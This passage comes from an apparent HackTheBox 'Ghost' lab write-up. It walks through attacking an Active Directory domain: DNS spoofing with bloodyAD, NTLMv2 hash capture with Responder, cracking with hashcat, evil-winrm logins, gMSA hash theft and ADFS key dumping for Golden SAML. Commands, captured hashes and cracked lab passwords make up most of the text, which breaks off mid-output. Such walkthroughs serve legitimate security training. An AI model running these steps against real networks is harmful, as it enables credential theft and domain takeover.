2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 20 containers</span><br><span class="line">INFO: Found 1 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: linux-dev-ws01.ghost.htb</span><br><span class="line">INFO: Querying computer: DC01.ghost.htb</span><br><span class="line">INFO: Ignoring host linux-dev-ws01.ghost.htb since its hostname does not match: Supplied hostname linux-dev-ws01.ghost.htb does not match reported hostnames dc01 or dc01.ghost.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 33S</span><br><span class="line">INFO: Compressing output into 20250403185019_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>One more thing, when prompted for the password I entered <code>He!KA9oKVT3rL99j</code>, the one we got earlier from our <code>docker-entrypoint.sh</code> execution in the environment variables.<br>As I started running out of ideas, I remember a discussion I saw earlier on the forum:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/dns.png"
                      alt="DNS Forum Discussion"
                ><figcaption>DNS Forum Discussion</figcaption></figure></p>
<p>We can see that DNS is not configured for BitBucket and that Justin (who is <code>justin.bradley</code>) is running a script against it. Then what we can do is add a DNS record for <code>bitbucket.ghost.htb</code> pointing to our IP as user florence.ramirez and therefore perform a DNS Spoofing attack. Lessgo:<br>We can do that using BloodyAD:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ python3 bloodyAD/bloodyAD.py -v INFO  -u <span class="string">&#x27;florence.ramirez&#x27;</span> -d <span class="string">&#x27;ghost.htb&#x27;</span> -k  --dc-ip 10.129.231.105 --host dc01.ghost.htb add dnsRecord bitbucket 10.10.16.25</span><br><span class="line">[+] bitbucket has been successfully added</span><br><span class="line">                                                                                                 </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ python3 bloodyAD/bloodyAD.py -v INFO  -u <span class="string">&#x27;florence.ramirez&#x27;</span>  -d <span class="string">&#x27;ghost.htb&#x27;</span> -k  --dc-ip 10.129.231.105 --host dc01.ghost.htb add dnsRecord bitbucket 10.10.16.25</span><br><span class="line">[b<span class="string">&#x27;\x04\x00\x01\x00\x05\xf0\x00\x00\xf7\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x00\x00\x00\x00\x00\n\n\x10\x19&#x27;</span>, b<span class="string">&#x27;\x04\x00\x01\x00\x05\xf0\x00\x00\xf7\x00\x00\x00\x00\x00\x01,\x00\x00\x00\x00\x00\x00\x00\x00\n\n\x10\x19&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/kali/Hackthebox/GHost/bloodyAD/bloodyAD.py&quot;</span>, line 5, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    main.main()</span><br><span class="line">  File <span class="string">&quot;/home/kali/Hackthebox/GHost/bloodyAD/bloodyAD/main.py&quot;</span>, line 210, <span class="keyword">in</span> main</span><br><span class="line">    output = args.func(conn, **params)</span><br><span class="line">             ^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;/home/kali/Hackthebox/GHost/bloodyAD/bloodyAD/cli_modules/add.py&quot;</span>, line 196, <span class="keyword">in</span> dnsRecord</span><br><span class="line">    conn.ldap.bloodymodify(</span><br><span class="line">  File <span class="string">&quot;/home/kali/Hackthebox/GHost/bloodyAD/bloodyAD/network/ldap.py&quot;</span>, line 301, <span class="keyword">in</span> bloodymodify</span><br><span class="line">    raise err</span><br><span class="line">msldap.commons.exceptions.LDAPModifyException: LDAP Modify operation failed on DN DC=bitbucket,DC=ghost.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ghost,DC=htb! Result code: <span class="string">&quot;attributeOrValueExists&quot;</span> Reason: <span class="string">&quot;b&#x27;00002083: AtrErr: DSID-03151E7F, #1:\n\t0: 00002083: DSID-03151E7F, problem 1006 (ATT_OR_VALUE_EXISTS), data 0, Att 9017e (dnsRecord)\n\x00&#x27;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And looking at our Responder that we setup for listening:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ sudo responder -I tun0 -v  </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.25]</span><br><span class="line">    Responder IPv6             [dead:beef:4::1017]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-J9N6LZMTXL3]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [L834.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [46909]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...                                                                      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[HTTP] Sending NTLM authentication request to 10.129.231.105</span></span><br><span class="line"><span class="string">[HTTP] GET request from: ::ffff:10.129.231.105  URL: / </span></span><br><span class="line"><span class="string">[HTTP] NTLMv2 Client   : 10.129.231.105</span></span><br><span class="line"><span class="string">[HTTP] NTLMv2 Username : ghost\justin.bradley</span></span><br><span class="line"><span class="string">[HTTP] NTLMv2 Hash     : justin.bradley::ghost:4e13a224dcde8a9d:DE140DC10FDD8DB5B34373E9882173F6:01010000000000006E2AE55ED6A4DB01B8EA24C0AE23971A00000000020008004C0038003300340001001E00570049004E002D004A0039004E0036004C005A004D00540058004C003300040014004C003800330034002E004C004F00430041004C0003003400570049004E002D004A0039004E0036004C005A004D00540058004C0033002E004C003800330034002E004C004F00430041004C00050014004C003800330034002E004C004F00430041004C000800300030000000000000000000000000400000624B257BF30FAAE22CA34BCB530D545CB86AB0F5669A883DDCAE65BFDE9330010A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000  </span></span><br></pre></td></tr></table></figure></div>

<p>AND IT WORKED!!</p>
<p>Letâ€™s now try to crack the hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ hashcat -m 5600 -a 0 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-sandybridge-AMD Ryzen 7 4800H with Radeon Graphics, 2212/4489 MB (1024 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password/salt length (usually down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better <span class="keyword">for</span> specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">JUSTIN.BRADLEY::ghost:4e13a224dcde8a9d:de140dc10fdd8db5b34373e9882173f6:01010000000000006e2ae55ed6a4db01b8ea24c0ae23971a00000000020008004c0038003300340001001e00570049004e002d004a0039004e0036004c005a004d00540058004c003300040014004c003800330034002e004c004f00430041004c0003003400570049004e002d004a0039004e0036004c005a004d00540058004c0033002e004c003800330034002e004c004f00430041004c00050014004c003800330034002e004c004f00430041004c000800300030000000000000000000000000400000624b257bf30faae22ca34bcb530d545cb86ab0f5669a883ddcae65bfde9330010a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: JUSTIN.BRADLEY::ghost:4e13a224dcde8a9d:de140dc10fdd...000000</span><br><span class="line">Time.Started.....: Thu Apr  3 20:27:59 2025 (12 secs)</span><br><span class="line">Time.Estimated...: Thu Apr  3 20:28:11 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:   874.8 kH/s (1.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 10711040/14344385 (74.67%)</span><br><span class="line">Rejected.........: 0/10711040 (0.00%)</span><br><span class="line">Restore.Point....: 10708992/14344385 (74.66%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: R302521 -&gt; Quemierda</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 62%</span></span><br><span class="line"></span><br><span class="line">Started: Thu Apr  3 20:27:58 2025</span><br><span class="line">Stopped: Thu Apr  3 20:28:13 2025</span><br><span class="line">                                  </span><br></pre></td></tr></table></figure></div>

<p><code>JUSTIN.BRADLEY:Qwertyuiop1234$$</code></p>
<p>Letâ€™s attempt to use this to login usin evil-winrm (which works in case the user is part of Remote Management Users group):</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ evil-winrm -i dc01.ghost.htb -u JUSTIN.BRADLEY -p <span class="string">&#x27;Qwertyuiop1234$$&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                           </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                             </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\justin.bradley\Documents&gt; <span class="built_in">cd</span> ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\justin.bradley\desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">550cea959f87ff4619c672b815a18faf</span><br><span class="line">*Evil-WinRM* PS C:\Users\justin.bradley\desktop&gt; </span><br></pre></td></tr></table></figure></div>

<p>And we got our user flag!</p>
<h3 id="Privilege-Escalation-ADFS-abuse-to-RCE"><a href="#Privilege-Escalation-ADFS-abuse-to-RCE" class="headerlink" title="Privilege Escalation - ADFS abuse to RCE"></a>Privilege Escalation - ADFS abuse to RCE</h3><h4 id="ReadGMSAPassword-abuse-access-to-adfs-gmsa-account"><a href="#ReadGMSAPassword-abuse-access-to-adfs-gmsa-account" class="headerlink" title="ReadGMSAPassword abuse &#x3D;&gt; access to adfs_gmsa$ account"></a>ReadGMSAPassword abuse &#x3D;&gt; access to adfs_gmsa$ account</h4><p>Checking our BloodHound, we can see that justin.bradley can read gmsa passwords:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/adfs.png"
                      alt="ReadGMSAPassword"
                ><figcaption>ReadGMSAPassword</figcaption></figure></p>
<p>We can read it directly this way:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ netexec ldap 10.129.231.105 -u justin.bradley -p <span class="string">&#x27;Qwertyuiop1234$$&#x27;</span> --gmsa</span><br><span class="line">/usr/lib/python3/dist-packages/bloodhound/ad/utils.py:115: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\-&#x27;</span></span><br><span class="line">  xml_sid_rex = re.compile(<span class="string">&#x27;&lt;UserId&gt;(S-[0-9\-]+)&lt;/UserId&gt;&#x27;</span>)</span><br><span class="line">SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAPS       10.129.231.105  636    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$</span><br><span class="line">LDAPS       10.129.231.105  636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAPS       10.129.231.105  636    DC01             Account: adfs_gmsa$           NTLM: 9de4d086a1443bef82340604766d69c9 </span><br></pre></td></tr></table></figure></div>

<p>And we can now login using that hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ evil-winrm -i dc01.ghost.htb -u adfs_gmsa$ -H 9de4d086a1443bef82340604766d69c9</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                           </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                             </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">ghost\adfs_gmsa$</span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; hostname</span><br><span class="line">DC01</span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="Golden-SAML-attack"><a href="#Golden-SAML-attack" class="headerlink" title="Golden SAML attack"></a>Golden SAML attack</h4><p>Golden SAML is a post-exploitation attack technique that allows an attacker to impersonate any user, including domain admins, by forging SAML authentication tokens. It is commonly used against Active Directory Federation Services (ADFS) environments.</p>
<p>First weâ€™ll have to steal the ADFS token-signin certificate, for that we can use this <a class="link"   target="_blank" rel="noopener" href="https://github.com/jakobfriedl/precompiled-binaries/blob/main/LateralMovement/ADFSDump.exe" >ADFSDump.exe <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> against our recently compromised account:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~/Hackthebox/GHost]</span><br><span class="line">â””â”€$ evil-winrm -i dc01.ghost.htb -u adfs_gmsa$ -H 9de4d086a1443bef82340604766d69c9</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                           </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                             </span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; upload ADFSDump.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /home/kali/Hackthebox/GHost/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe                                                                                            </span><br><span class="line">                                        </span><br><span class="line">Data: 40276 bytes of 40276 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt; ./ADFSDump.exe</span><br><span class="line">    ___    ____  ___________ ____</span><br><span class="line">   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____</span><br><span class="line">  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \</span><br><span class="line"> / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /</span><br><span class="line">/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/</span><br><span class="line">                                              /_/</span><br><span class="line">Created by @doughsec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Extracting Private Key from Active Directory Store</span></span><br><span class="line">[-] Domain is ghost.htb</span><br><span class="line">[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Reading Encrypted Signing Key from Database</span></span><br><span class="line">[-] Encrypted Token Signing Key Begin</span><br><span 